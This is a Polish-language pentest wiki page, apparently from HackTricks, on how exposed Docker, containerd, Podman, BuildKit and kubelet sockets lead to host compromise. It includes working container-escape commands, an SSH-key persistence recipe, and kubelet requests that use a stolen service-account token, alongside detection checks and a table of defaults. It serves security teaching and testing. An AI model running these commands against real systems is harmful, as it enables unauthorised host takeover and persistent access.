# Ekspozycja Runtime API i Daemonów

## Przegląd

Wiele rzeczywistych kompromitacji kontenerów wcale nie zaczyna się od ucieczki z namespace. Zaczynają się od dostępu do control plane runtime. Jeśli workload może komunikować się z `dockerd`, `containerd`, CRI-O, Podmanem lub kubeletem przez zamontowany Unix socket albo udostępniony listener TCP, attacker może mieć możliwość zażądania utworzenia nowego kontenera z większymi uprawnieniami, zamontowania systemu plików hosta, dołączenia do namespace hosta lub pobrania wrażliwych informacji o węźle. W takich przypadkach runtime API jest rzeczywistą granicą bezpieczeństwa, a jego kompromitacja jest funkcjonalnie zbliżona do kompromitacji hosta.

Dlatego ekspozycję runtime socketu należy dokumentować oddzielnie od zabezpieczeń kernela. Kontener ze standardowym seccomp, capabilities i ograniczeniami MAC może nadal być oddalony o jedno wywołanie API od kompromitacji hosta, jeśli `/var/run/docker.sock` lub `/run/containerd/containerd.sock` jest zamontowany wewnątrz kontenera. Izolacja kernela bieżącego kontenera może działać dokładnie zgodnie z założeniami, podczas gdy management plane runtime pozostaje w pełni exposed.

## Modele dostępu do Daemonów

Docker Engine tradycyjnie udostępnia swoje uprzywilejowane API przez lokalny Unix socket `unix:///var/run/docker.sock`. Historycznie był on również udostępniany zdalnie przez listenery TCP, takie jak `tcp://0.0.0.0:2375`, lub listener chroniony przez TLS na porcie `2376`. Zdalne udostępnienie daemona bez silnego TLS i uwierzytelniania klienta skutecznie zamienia Docker API w zdalny interfejs roota.

containerd, CRI-O, Podman i kubelet udostępniają podobne powierzchnie o dużym wpływie. Nazwy i workflow różnią się, ale logika pozostaje taka sama. Jeśli interfejs pozwala wywołującemu tworzyć workloady, montować ścieżki hosta, pobierać credentials lub modyfikować działające kontenery, jest uprzywilejowanym kanałem zarządzania i powinien być odpowiednio traktowany.

Typowe lokalne ścieżki, które warto sprawdzić, to:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Starsze lub bardziej wyspecjalizowane stacki mogą również udostępniać endpointy takie jak `dockershim.sock`, `frakti.sock` lub `rktlet.sock`. Są one mniej powszechne we współczesnych środowiskach, ale po ich wykryciu należy traktować je z taką samą ostrożnością, ponieważ reprezentują powierzchnie kontroli runtime, a nie zwykłe sockety aplikacji.

## Bezpieczny zdalny dostęp

Jeśli daemon musi być udostępniony poza lokalnym socketem, połączenie powinno być chronione za pomocą TLS, a najlepiej także wzajemnego uwierzytelniania, aby daemon weryfikował klienta, a klient weryfikował daemon. Stary zwyczaj otwierania Docker daemon przez zwykły HTTP dla wygody jest jednym z najbardziej niebezpiecznych błędów w administracji kontenerami, ponieważ powierzchnia API jest wystarczająco rozbudowana, aby bezpośrednio tworzyć uprzywilejowane kontenery.

Historyczny schemat konfiguracji Docker wyglądał następująco:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
Na hostach opartych na systemd komunikacja z daemonem może również pojawiać się jako `fd://`, co oznacza, że proces dziedziczy wcześniej otwarty socket od systemd, zamiast samodzielnie bezpośrednio go bindować. Najważniejsza jest nie dokładna składnia, lecz konsekwencja dla bezpieczeństwa. W chwili, gdy daemon nasłuchuje poza lokalnym socketem z restrykcyjnymi uprawnieniami, bezpieczeństwo transportu i uwierzytelnianie klienta stają się obowiązkowe, a nie opcjonalnym hardeningiem.

## Nadużycie

Jeśli socket runtime jest dostępny, potwierdź, który to socket, czy istnieje kompatybilny klient oraz czy możliwy jest dostęp przez raw HTTP lub gRPC:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```
Te polecenia są przydatne, ponieważ pozwalają odróżnić nieistniejącą ścieżkę, zamontowany, ale niedostępny socket oraz działające uprzywilejowane API. Jeśli klient zadziała, kolejne pytanie brzmi, czy API może uruchomić nowy kontener z host bind mountem lub współdzieleniem przestrzeni nazw hosta.

### Gdy nie zainstalowano żadnego klienta

Brak `docker`, `podman` lub innego przyjaznego CLI nie oznacza, że socket jest bezpieczny. Docker Engine komunikuje się za pomocą HTTP przez swój Unix socket, a Podman udostępnia zarówno API kompatybilne z Dockerem, jak i natywne API Libpod za pośrednictwem `podman system service`. Oznacza to, że minimalne środowisko zawierające tylko `curl` może nadal wystarczyć do sterowania daemonem:
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
-X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```
Ma to znaczenie podczas post-exploitation, ponieważ obrońcy czasami usuwają standardowe client binaries, ale pozostawiają zamontowany management socket. Na hostach Podman pamiętaj, że ścieżka o wysokiej wartości różni się w zależności od wdrożenia rootful i rootless: `unix:///run/podman/podman.sock` dla instancji usługi rootful oraz `unix://$XDG_RUNTIME_DIR/podman/podman.sock` dla instancji rootless.

### Pełny przykład: Docker Socket To Host Root

Jeśli `docker.sock` jest dostępny, klasyczny escape polega na uruchomieniu nowego containera, który montuje główny system plików hosta, a następnie wykonaniu w nim `chroot`:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Zapewnia to bezpośrednie wykonywanie poleceń z uprawnieniami host-root za pośrednictwem Docker daemon. Skutki nie ograniczają się do odczytu plików. Po wejściu do nowego kontenera attacker może modyfikować pliki hosta, pozyskiwać credentials, instalować persistence lub uruchamiać dodatkowe uprzywilejowane workloady.

### Pełny przykład: Docker Socket do Namespace'ów Hosta

Jeśli attacker preferuje wejście do namespace'ów zamiast dostępu ograniczonego wyłącznie do filesystemu:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Ta ścieżka dociera do hosta, prosząc runtime o utworzenie nowego kontenera z jawną ekspozycją przestrzeni nazw hosta, zamiast wykorzystywać obecny kontener.

### Docker Socket Persistence Pattern

Kontrola runtime może być również użyta do persistence zamiast jednorazowego shell. Ogólny schemat polega na utworzeniu kontenera pomocniczego z mountem hosta, zapisaniu w zamontowanym systemie plików hosta materiałów autoryzowanego dostępu lub hooka startowego, a następnie sprawdzeniu, czy host go wykorzysta.

Przykładowy schemat:
```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```
Ta sama idea może dotyczyć jednostek systemd, fragmentów cron, plików startowych aplikacji lub kluczy SSH, zależnie od tego, co operator chce udowodnić. Ważne jest to, że trwała zmiana jest wprowadzana za pośrednictwem uprawnień runtime daemon do systemu plików hosta, a nie przez dodatkowe uprawnienia w oryginalnym kontenerze.

### Raw Docker API Helper Pivot

Gdy brakuje Docker CLI, ten sam przepływ z helperem i host mountem można realizować przez HTTP za pośrednictwem Unix socket. Ogólny przepływ wygląda następująco: potwierdź API, utwórz helper container z host bind mount, uruchom go, utwórz instancję exec i uruchom ten exec.
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
-X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
-X POST http://localhost/v1.54/containers/helper/exec
```
Końcowe żądanie `/exec/<id>/start` zależy od zwróconego identyfikatora exec, ale kwestia bezpieczeństwa jest niezależna od dokładnego sposobu obsługi JSON: bezpośredni dostęp do API rootful Docker daemon wystarczy, aby zażądać silniejszego workloadu pomocniczego.

### Pełny przykład: Socket `containerd`

Zamontowany socket `containerd` jest zwykle równie niebezpieczny:<sup>[[1]](#references)</sup>
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
Jeśli dostępny jest klient bardziej zbliżony do Docker, `nerdctl` może być wygodniejszy niż `ctr`, ponieważ udostępnia znane flagi, takie jak `--privileged`, `--pid=host` i `-v`:
```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
--privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```
Skutkiem jest ponownie przejęcie hosta. Nawet jeśli brakuje narzędzi specyficznych dla Dockera, inny runtime API może nadal oferować taką samą władzę administracyjną. Na węzłach Kubernetes `crictl` również może wystarczyć do rozpoznania i interakcji z kontenerami, ponieważ komunikuje się bezpośrednio z endpointem CRI.

### Socket BuildKit

`buildkitd` łatwo przeoczyć, ponieważ często uważa się go za „tylko backend procesu build”, ale daemon nadal jest uprzywilejowaną płaszczyzną sterowania. Dostępny `buildkitd.sock` może umożliwić attackerowi uruchamianie dowolnych kroków build, sprawdzanie capabilities workera, używanie lokalnych contextów z przejętego środowiska oraz żądanie niebezpiecznych entitlements, takich jak `network.host` lub `security.insecure`, jeśli daemon został skonfigurowany tak, aby na nie zezwalać.

Przydatne pierwsze interakcje to:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```
Jeśli daemon akceptuje żądania budowania, sprawdź, czy dostępne są niebezpieczne uprawnienia:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
--frontend dockerfile.v0 \
--local context=. \
--local dockerfile=. \
--allow network.host \
--allow security.insecure \
--output type=local,dest=/tmp/buildkit-out
```
Dokładny wpływ zależy od konfiguracji daemona, ale usługa BuildKit działająca jako root z permissive entitlements nie jest nieszkodliwym udogodnieniem dla developerów. Traktuj ją jako kolejną powierzchnię administracyjną o wysokiej wartości, szczególnie na runnerach CI i współdzielonych węzłach build.

### Kubelet API przez TCP

Kubelet nie jest container runtime, ale nadal stanowi część płaszczyzny zarządzania węzłem i często mieści się w tej samej dyskusji dotyczącej granicy zaufania. Jeśli secure port kubeleta `10250` jest dostępny z workloadu albo ujawnione zostaną dane uwierzytelniające węzła, kubeconfigi lub uprawnienia proxy, attacker może być w stanie wyliczyć Pody, pobrać logi lub wykonywać polecenia w kontenerach lokalnych dla węzła bez dotykania ścieżki admission serwera Kubernetes API.

Zacznij od taniego rozpoznania:
```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```
Jeśli kubelet lub ścieżka proxy API-server autoryzuje `exec`, klient obsługujący WebSocket może wykorzystać to do wykonania kodu w innych kontenerach na tym węźle. Z tego samego powodu `nodes/proxy` z uprawnieniem tylko `get` jest bardziej niebezpieczne, niż mogłoby się wydawać: żądanie nadal może dotrzeć do endpointów kubeleta wykonujących polecenia, a te bezpośrednie interakcje z kubeletem nie pojawiają się w standardowych logach audytu Kubernetes.<sup>[[2]](#references)</sup>

## Checks

Celem tych kontroli jest ustalenie, czy kontener może dotrzeć do jakiejkolwiek płaszczyzny zarządzania, która powinna pozostać poza granicą zaufania.
```bash
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```
Co jest tutaj interesujące:

- Zamontowany runtime socket jest zwykle bezpośrednim mechanizmem administracyjnym, a nie jedynie ujawnieniem informacji.
- Listener TCP na `2375` bez TLS należy traktować jako warunek umożliwiający zdalne przejęcie.
- Zmienne środowiskowe, takie jak `DOCKER_HOST`, często ujawniają, że workload został celowo zaprojektowany do komunikacji z runtime hosta.

## Domyślne ustawienia runtime

| Runtime / platforma | Stan domyślny | Domyślne zachowanie | Typowe ręczne osłabienie |
| --- | --- | --- | --- |
| Docker Engine | Lokalny Unix socket domyślnie | `dockerd` nasłuchuje na lokalnym sockecie, a daemon zwykle działa z uprawnieniami root | montowanie `/var/run/docker.sock`, udostępnianie `tcp://...:2375`, słaby lub brak TLS na `2376` |
| Podman | Domyślnie CLI bez daemona | Do zwykłego lokalnego użycia nie jest wymagany długotrwale działający uprzywilejowany daemon; API sockets mogą jednak zostać udostępnione po włączeniu `podman system service` | udostępnianie `podman.sock`, szerokie uruchamianie service, użycie rootful API |
| containerd | Lokalny uprzywilejowany socket | Administracyjne API jest udostępniane przez lokalny socket i zwykle używane przez narzędzia wyższego poziomu | montowanie `containerd.sock`, szeroki dostęp przez `ctr` lub `nerdctl`, udostępnianie uprzywilejowanych namespaces |
| CRI-O | Lokalny uprzywilejowany socket | Endpoint CRI jest przeznaczony dla zaufanych komponentów lokalnych dla noda | montowanie `crio.sock`, udostępnianie endpointu CRI niezaufanym workloadom |
| Kubernetes kubelet | Lokalny dla noda management API | Kubelet nie powinien być szeroko dostępny z Podów; dostęp może ujawniać stan Podów, credentials i funkcje wykonywania, zależnie od authn/authz | montowanie socketów lub certyfikatów kubelet, słabe uwierzytelnianie kubelet, host networking wraz z dostępnym endpointem kubelet |

## References

- [1] [eksploatacja containera socket część 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [2] [Ryzyka obejścia Kubernetes API Server](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
